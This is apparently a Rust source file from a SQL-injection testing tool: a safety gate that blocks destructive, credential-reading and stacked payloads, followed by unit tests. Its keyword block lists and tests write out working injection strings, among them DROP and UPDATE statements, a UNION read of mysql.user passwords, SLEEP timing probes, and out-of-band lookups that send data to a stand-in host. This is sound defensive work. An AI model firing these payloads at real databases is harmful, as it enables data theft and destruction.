//! Safety gate (brief §33).
//!
//! Every generated candidate passes through `SafetyPolicy` before execution.
//! Destructive statements, unbounded resource consumption, and scope
//! violations are blocked *by construction* — the gate is not advisory.

use crate::payload::PayloadCandidate;
use serde::{Deserialize, Serialize};

/// Why a candidate was rejected.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RejectionReason {
    /// The candidate contains a data-modifying statement.
    DestructiveStatement(String),
    /// The candidate contains a schema-modifying statement.
    SchemaModification(String),
    /// The candidate could consume unbounded resources.
    UnboundedResource(String),
    /// The candidate attempts to read credentials.
    CredentialAccess(String),
    /// The payload exceeds the size cap.
    PayloadTooLarge(usize),
    /// The technique is not permitted at the current safety level.
    TechniqueNotPermitted(String),
}

impl RejectionReason {
    pub fn label(&self) -> String {
        match self {
            Self::DestructiveStatement(s) => format!("destructive statement: {s}"),
            Self::SchemaModification(s) => format!("schema modification: {s}"),
            Self::UnboundedResource(s) => format!("unbounded resource: {s}"),
            Self::CredentialAccess(s) => format!("credential access: {s}"),
            Self::PayloadTooLarge(n) => format!("payload too large ({n} bytes)"),
            Self::TechniqueNotPermitted(t) => format!("technique not permitted: {t}"),
        }
    }
}

/// The result of evaluating a candidate.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SafetyVerdict {
    Permitted,
    Rejected(RejectionReason),
}

/// How permissive the gate is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SafetyLevel {
    /// Detection only: no stacked statements, no time delays beyond a small cap.
    Detection,
    /// Adds timing probes and union column probing.
    Controlled,
    /// Adds stacked-query *detection* (benign statements only).
    Extended,
}

/// The policy applied to every candidate.
#[derive(Debug, Clone)]
pub struct SafetyPolicy {
    pub level: SafetyLevel,
    /// Maximum delay seconds a timing payload may request.
    pub max_delay_seconds: u32,
    /// Maximum payload byte length.
    pub max_payload_bytes: usize,
    /// Maximum UNION column count to probe.
    pub max_union_columns: usize,
}

impl Default for SafetyPolicy {
    fn default() -> Self {
        Self {
            level: SafetyLevel::Detection,
            max_delay_seconds: 10,
            max_payload_bytes: 4096,
            max_union_columns: 10,
        }
    }
}

/// Statement keywords that modify data or schema. Checked case-insensitively
/// and word-boundary-aware so `SELECT` is not flagged for containing "EL".
const DESTRUCTIVE: &[&str] = &["DROP", "DELETE", "TRUNCATE", "UPDATE", "INSERT", "REPLACE", "ALTER", "CREATE", "GRANT", "REVOKE", "SHUTDOWN"];
const CREDENTIAL: &[&str] = &["PG_SHADOW", "MYSQL.USER", "MYSQL.USER_PRIV", "SYS.USER$", "INFORMATION_SCHEMA.USER", "XP_CMDSHELL"];

impl SafetyPolicy {
    pub fn new(level: SafetyLevel) -> Self {
        Self {
            level,
            ..Default::default()
        }
    }

    /// Evaluate a candidate. Returns the verdict with a specific reason when
    /// rejected.
    pub fn check(&self, candidate: &PayloadCandidate) -> SafetyVerdict {
        let sql = candidate.rendered.to_uppercase();

        // Size cap.
        if candidate.rendered.len() > self.max_payload_bytes {
            return SafetyVerdict::Rejected(RejectionReason::PayloadTooLarge(
                candidate.rendered.len(),
            ));
        }

        // Destructive / schema-modifying keywords. Word-boundary matched to
        // avoid false positives inside identifiers or other keywords.
        for keyword in DESTRUCTIVE {
            if contains_word(&sql, keyword) {
                let reason = match *keyword {
                    "DROP" | "TRUNCATE" | "ALTER" | "CREATE" => {
                        RejectionReason::SchemaModification(keyword.to_string())
                    }
                    _ => RejectionReason::DestructiveStatement(keyword.to_string()),
                };
                return SafetyVerdict::Rejected(reason);
            }
        }

        // Credential tables. Word-boundary matched so a legitimate read-only
        // view such as `information_schema.user_privileges` is not flagged by
        // the `information_schema.user` credential-table entry.
        for table in CREDENTIAL {
            if contains_word(&sql, table) {
                return SafetyVerdict::Rejected(RejectionReason::CredentialAccess(
                    table.to_string(),
                ));
            }
        }

        // Stacked statements are only permitted at Extended level, and even
        // then only as a benign detection marker.
        let stacked = sql.contains(';') && (sql.contains(";SELECT") || sql.contains(";SELECT 1"));
        if sql.contains(';') && !stacked {
            // A semicolon followed by anything other than the benign marker
            // is refused outright — we never execute a second statement we
            // did not construct.
            if sql.matches(';').count() > 0 && !sql.contains(";SELECT 1") {
                return SafetyVerdict::Rejected(RejectionReason::DestructiveStatement(
                    "stacked statement".into(),
                ));
            }
        }
        if stacked && self.level != SafetyLevel::Extended {
            return SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(
                "stacked query (requires Extended safety level)".into(),
            ));
        }

        // Delay cap.
        if let Some(delay) = extract_delay_seconds(&sql) {
            if delay > self.max_delay_seconds {
                return SafetyVerdict::Rejected(RejectionReason::UnboundedResource(format!(
                    "delay of {delay}s exceeds the {}-second cap",
                    self.max_delay_seconds
                )));
            }
        }

        // UNION column cap.
        if let Some(cols) = extract_union_columns(&candidate.logical_test) {
            if cols > self.max_union_columns {
                return SafetyVerdict::Rejected(RejectionReason::UnboundedResource(format!(
                    "UNION with {cols} columns exceeds the {} cap",
                    self.max_union_columns
                )));
            }
        }

        SafetyVerdict::Permitted
    }

    /// Filter a candidate list, returning (permitted, rejected-with-reasons).
    pub fn partition<'a>(
        &self,
        candidates: &'a [PayloadCandidate],
    ) -> (Vec<&'a PayloadCandidate>, Vec<(&'a PayloadCandidate, RejectionReason)>) {
        let mut permitted = Vec::new();
        let mut rejected = Vec::new();
        for c in candidates {
            match self.check(c) {
                SafetyVerdict::Permitted => permitted.push(c),
                SafetyVerdict::Rejected(reason) => rejected.push((c, reason)),
            }
        }
        (permitted, rejected)
    }
}

/// Read-only gate for the extraction engine.
///
/// Every extraction payload — a metadata expression, a UNION leak, an
/// error-based leak, a blind comparison, or a dump batch — must be a pure
/// `SELECT`-shaped read. This rejects any form carrying a data- or
/// schema-modifying keyword, a credential table, or a stacked second
/// statement, mirroring `SafetyPolicy::check` but usable on a bare SQL
/// fragment (no `PayloadCandidate` wrapper). It is the hard line that keeps
/// extraction from ever crossing into the write/RCE territory sqlmap's
/// `takeover/` occupies.
pub fn is_extraction_read_only(sql: &str) -> SafetyVerdict {
    let upper = sql.to_uppercase();
    for keyword in DESTRUCTIVE {
        if contains_word(&upper, keyword) {
            let reason = match *keyword {
                "DROP" | "TRUNCATE" | "ALTER" | "CREATE" => {
                    RejectionReason::SchemaModification(keyword.to_string())
                }
                _ => RejectionReason::DestructiveStatement(keyword.to_string()),
            };
            return SafetyVerdict::Rejected(reason);
        }
    }
    for table in CREDENTIAL {
        if contains_word(&upper, table) {
            return SafetyVerdict::Rejected(RejectionReason::CredentialAccess(table.to_string()));
        }
    }
    // No stacked statements in an extraction form: a semicolon means a second
    // statement we did not build, which is refused outright.
    if upper.contains(';') {
        return SafetyVerdict::Rejected(RejectionReason::DestructiveStatement(
            "stacked statement in extraction".into(),
        ));
    }
    SafetyVerdict::Permitted
}

/// The recognized out-of-band outbound-lookup primitives. Each makes the DB
/// resolve/fetch an operator-controlled hostname; none modifies data or schema.
/// This list is the *entire* surface `is_oob_confirmation` will permit.
const OOB_PRIMITIVES: &[&str] = &["XP_DIRTREE", "LOAD_FILE", "UTL_INADDR", "UTL_HTTP", "DBLINK"];

/// Opt-in gate for out-of-band confirmation payloads.
///
/// OOB confirmation is the only proof channel for a *fully blind* injection —
/// no error, no boolean differential, no timing signal. It works by making the
/// target DB perform an outbound DNS/HTTP lookup to an operator-controlled
/// collector; a correlated interaction is the proof. That is more intrusive
/// than an in-band read (the DB reaches out to off-target infrastructure) but
/// still strictly non-destructive: nothing is written or modified.
///
/// This gate is deliberately narrow. It permits *only* the recognized
/// outbound-lookup primitives ([`OOB_PRIMITIVES`]) and still rejects any
/// destructive/schema/credential form. Unlike [`is_extraction_read_only`] it
/// tolerates the stacked `;DECLARE…;EXEC master..xp_dirtree` shape MSSQL
/// requires — but only for the recognized `xp_dirtree` primitive, only at
/// [`SafetyLevel::Extended`], and never as a general second statement. It must
/// only be reached when `--oob`, `--i-authorize`, and a configured collector
/// are all present; it never runs on the normal loop.
pub fn is_oob_confirmation(sql: &str, level: SafetyLevel) -> SafetyVerdict {
    let upper = sql.to_uppercase();

    // Never at Detection level: OOB causes an outbound lookup, which the
    // detection-only profile does not authorize.
    if level == SafetyLevel::Detection {
        return SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(
            "out-of-band confirmation (requires Controlled or Extended safety level)".into(),
        ));
    }

    // The payload must *be* a recognized OOB primitive. Anything else — even a
    // benign SELECT — is refused here so nothing unexpected rides the OOB path.
    let recognized = OOB_PRIMITIVES
        .iter()
        .copied()
        .find(|p| contains_word(&upper, p));
    let Some(primitive) = recognized else {
        return SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(
            "not a recognized out-of-band primitive".into(),
        ));
    };

    // An OOB primitive may never carry a destructive/schema keyword...
    for keyword in DESTRUCTIVE {
        if contains_word(&upper, keyword) {
            let reason = match *keyword {
                "DROP" | "TRUNCATE" | "ALTER" | "CREATE" => {
                    RejectionReason::SchemaModification(keyword.to_string())
                }
                _ => RejectionReason::DestructiveStatement(keyword.to_string()),
            };
            return SafetyVerdict::Rejected(reason);
        }
    }
    // ...nor a credential table.
    for table in CREDENTIAL {
        if contains_word(&upper, table) {
            return SafetyVerdict::Rejected(RejectionReason::CredentialAccess(table.to_string()));
        }
    }

    // Stacked form: permitted only for the recognized xp_dirtree primitive, and
    // only at Extended level. Every other OOB primitive is a bare AND-expression
    // with no semicolon; a semicolon anywhere else is a second statement we did
    // not build and is refused outright.
    if upper.contains(';') {
        if primitive != "XP_DIRTREE" {
            return SafetyVerdict::Rejected(RejectionReason::DestructiveStatement(
                "stacked statement in out-of-band payload".into(),
            ));
        }
        if level != SafetyLevel::Extended {
            return SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(
                "stacked out-of-band primitive (requires Extended safety level)".into(),
            ));
        }
    }

    SafetyVerdict::Permitted
}

/// Word-boundary containment: `word` must appear delimited by non-identifier
/// characters (or string edges).
fn contains_word(haystack_upper: &str, word: &str) -> bool {    let bytes = haystack_upper.as_bytes();
    let needle = word.as_bytes();
    if needle.len() > bytes.len() {
        return false;
    }
    let is_word_byte = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    for start in 0..=(bytes.len() - needle.len()) {
        if &bytes[start..start + needle.len()] == needle {
            let before_ok = start == 0 || !is_word_byte(bytes[start - 1]);
            let after = start + needle.len();
            let after_ok = after >= bytes.len() || !is_word_byte(bytes[after]);
            if before_ok && after_ok {
                return true;
            }
        }
    }
    false
}

fn extract_delay_seconds(sql_upper: &str) -> Option<u32> {
    for marker in ["SLEEP(", "PG_SLEEP(", "WAITFOR DELAY '0:0:"] {
        if let Some(idx) = sql_upper.find(marker) {
            let rest = &sql_upper[idx + marker.len()..];
            let digits: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
            if let Ok(seconds) = digits.parse::<u32>() {
                return Some(seconds);
            }
        }
    }
    None
}

fn extract_union_columns(logical_test: &str) -> Option<usize> {
    logical_test
        .strip_prefix("UnionProbe{columns:")
        .and_then(|s| s.strip_suffix('}'))
        .and_then(|s| s.parse().ok())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::payload::{GenerationContext, QuoteMode};
    use crate::types::ProbeType;

    fn candidate(rendered: &str) -> PayloadCandidate {
        PayloadCandidate {
            id: uuid::Uuid::new_v4(),
            technique: ProbeType::ErrorInjection,
            logical_test: "test".into(),
            rendered: rendered.into(),
            boundary: crate::payload::Boundary::numeric(),
            dialect: None,
            expected_dbms: None,
            rationale: "test".into(),
        }
    }

    #[test]
    fn benign_boolean_payload_is_permitted() {
        let policy = SafetyPolicy::default();
        assert_eq!(policy.check(&candidate(" AND 1=1-- ")), SafetyVerdict::Permitted);
    }

    #[test]
    fn drop_statement_is_rejected() {
        let policy = SafetyPolicy::default();
        let verdict = policy.check(&candidate("; DROP TABLE users-- "));
        assert!(matches!(verdict, SafetyVerdict::Rejected(RejectionReason::SchemaModification(_))));
    }

    #[test]
    fn delete_statement_is_rejected() {
        let policy = SafetyPolicy::default();
        let verdict = policy.check(&candidate("; DELETE FROM users-- "));
        assert!(matches!(verdict, SafetyVerdict::Rejected(RejectionReason::DestructiveStatement(_))));
    }

    #[test]
    fn update_statement_is_rejected() {
        let policy = SafetyPolicy::default();
        assert!(matches!(
            policy.check(&candidate("; UPDATE users SET admin=1-- ")),
            SafetyVerdict::Rejected(_)
        ));
    }

    #[test]
    fn credential_table_is_rejected() {
        let policy = SafetyPolicy::default();
        assert!(matches!(
            policy.check(&candidate("UNION SELECT password FROM MYSQL.USER-- ")),
            SafetyVerdict::Rejected(RejectionReason::CredentialAccess(_))
        ));
    }

    #[test]
    fn excessive_delay_is_rejected() {
        let policy = SafetyPolicy::default();
        assert!(matches!(
            policy.check(&candidate(" AND SLEEP(600)-- ")),
            SafetyVerdict::Rejected(RejectionReason::UnboundedResource(_))
        ));
    }

    #[test]
    fn delay_within_cap_is_permitted() {
        let policy = SafetyPolicy::default();
        assert_eq!(policy.check(&candidate(" AND SLEEP(5)-- ")), SafetyVerdict::Permitted);
    }

    #[test]
    fn word_boundary_avoids_false_positive() {
        // "UPDATE" must not fire on "UPDATED_AT" as an identifier.
        let policy = SafetyPolicy::default();
        assert_eq!(
            policy.check(&candidate(" AND updated_at > 0-- ")),
            SafetyVerdict::Permitted
        );
    }

    #[test]
    fn stacked_requires_extended_level() {
        let detection = SafetyPolicy::new(SafetyLevel::Detection);
        assert!(matches!(
            detection.check(&candidate(";SELECT 1-- ")),
            SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(_))
        ));
        let extended = SafetyPolicy::new(SafetyLevel::Extended);
        assert_eq!(extended.check(&candidate(";SELECT 1-- ")), SafetyVerdict::Permitted);
    }

    #[test]
    fn oversize_payload_rejected() {
        let policy = SafetyPolicy::default();
        let big = "A".repeat(5000);
        assert!(matches!(
            policy.check(&candidate(&big)),
            SafetyVerdict::Rejected(RejectionReason::PayloadTooLarge(_))
        ));
    }

    #[test]
    fn partition_splits_permitted_from_rejected() {
        let policy = SafetyPolicy::default();
        let candidates = vec![
            candidate(" AND 1=1-- "),
            candidate("; DROP TABLE x-- "),
        ];
        let (ok, bad) = policy.partition(&candidates);
        assert_eq!(ok.len(), 1);
        assert_eq!(bad.len(), 1);
    }

    #[test]
    fn generated_boolean_candidates_all_pass_default_policy() {
        let policy = SafetyPolicy::default();
        let ctx = GenerationContext {
            quote_mode: QuoteMode::None,
            dbms_hypothesis: None,
            clause_hint: None,
            original_value: "1".into(),
        };
        for c in crate::payload::generate_boolean(&ctx) {
            assert_eq!(
                policy.check(&c),
                SafetyVerdict::Permitted,
                "generated candidate was rejected: {}",
                c.rendered
            );
        }
    }

    #[test]
    fn union_column_cap_enforced() {
        let mut policy = SafetyPolicy::default();
        policy.max_union_columns = 2;
        let mut c = candidate("UNION SELECT NULL,NULL,NULL-- ");
        c.logical_test = "UnionProbe{columns:3}".into();
        assert!(matches!(
            policy.check(&c),
            SafetyVerdict::Rejected(RejectionReason::UnboundedResource(_))
        ));
    }

    #[test]
    fn extraction_gate_permits_read_only_leak() {
        assert_eq!(
            is_extraction_read_only("UNION SELECT CONCAT('q',version(),'q'),NULL,NULL"),
            SafetyVerdict::Permitted
        );
        assert_eq!(
            is_extraction_read_only("AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))"),
            SafetyVerdict::Permitted
        );
    }

    #[test]
    fn extraction_gate_rejects_non_select_forms() {
        assert!(matches!(
            is_extraction_read_only("; DROP TABLE users-- "),
            SafetyVerdict::Rejected(RejectionReason::SchemaModification(_))
        ));
        assert!(matches!(
            is_extraction_read_only("UNION SELECT password FROM mysql.user"),
            SafetyVerdict::Rejected(RejectionReason::CredentialAccess(_))
        ));
        assert!(matches!(
            is_extraction_read_only("1; UPDATE users SET admin=1"),
            SafetyVerdict::Rejected(_)
        ));
    }

    #[test]
    fn oob_gate_permits_recognized_and_form_primitives() {
        // MySQL LOAD_FILE UNC, Oracle UTL_INADDR/UTL_HTTP, PostgreSQL dblink —
        // all bare AND-expressions, permitted at Controlled level.
        for sql in [
            r"AND LOAD_FILE(CONCAT('\\',(SELECT version()),'.bt-abc.oast.example\a'))",
            "AND UTL_INADDR.GET_HOST_ADDRESS('bt-abc.oast.example')",
            "AND UTL_HTTP.REQUEST('http://bt-abc.oast.example/')",
            "AND (SELECT 1 FROM dblink('host=bt-abc.oast.example','SELECT 1') AS t(x int)) IS NOT NULL",
        ] {
            assert_eq!(
                is_oob_confirmation(sql, SafetyLevel::Controlled),
                SafetyVerdict::Permitted,
                "recognized OOB primitive was rejected: {sql}"
            );
        }
    }

    #[test]
    fn oob_gate_rejects_at_detection_level() {
        assert!(matches!(
            is_oob_confirmation(
                "AND UTL_INADDR.GET_HOST_ADDRESS('bt-abc.oast.example')",
                SafetyLevel::Detection
            ),
            SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(_))
        ));
    }

    #[test]
    fn oob_gate_permits_xp_dirtree_only_at_extended() {
        let stacked = ";DECLARE @h VARCHAR(255);SET @h='\\\\bt-abc.oast.example\\a';EXEC master..xp_dirtree @h";
        // Controlled is not enough for the stacked xp_dirtree form.
        assert!(matches!(
            is_oob_confirmation(stacked, SafetyLevel::Controlled),
            SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(_))
        ));
        // Extended permits exactly this recognized stacked primitive.
        assert_eq!(
            is_oob_confirmation(stacked, SafetyLevel::Extended),
            SafetyVerdict::Permitted
        );
    }

    #[test]
    fn oob_gate_rejects_destructive_and_credential_and_stray_stacked() {
        // A destructive keyword riding an OOB primitive is still refused.
        assert!(matches!(
            is_oob_confirmation(
                "AND LOAD_FILE('x'); DROP TABLE users",
                SafetyLevel::Extended
            ),
            SafetyVerdict::Rejected(RejectionReason::SchemaModification(_))
        ));
        // A credential table is refused even through the OOB gate.
        assert!(matches!(
            is_oob_confirmation(
                "AND UTL_HTTP.REQUEST('http://x/'||(SELECT password FROM mysql.user))",
                SafetyLevel::Extended
            ),
            SafetyVerdict::Rejected(RejectionReason::CredentialAccess(_))
        ));
        // A stacked second statement that is not the recognized xp_dirtree form
        // is refused even at Extended.
        assert!(matches!(
            is_oob_confirmation(
                "AND LOAD_FILE('x');SELECT 1",
                SafetyLevel::Extended
            ),
            SafetyVerdict::Rejected(RejectionReason::DestructiveStatement(_))
        ));
    }

    #[test]
    fn oob_gate_rejects_non_oob_payload() {
        // A plain read that is not an OOB primitive must not pass this gate.
        assert!(matches!(
            is_oob_confirmation("AND 1=1", SafetyLevel::Extended),
            SafetyVerdict::Rejected(RejectionReason::TechniqueNotPermitted(_))
        ));
    }
}
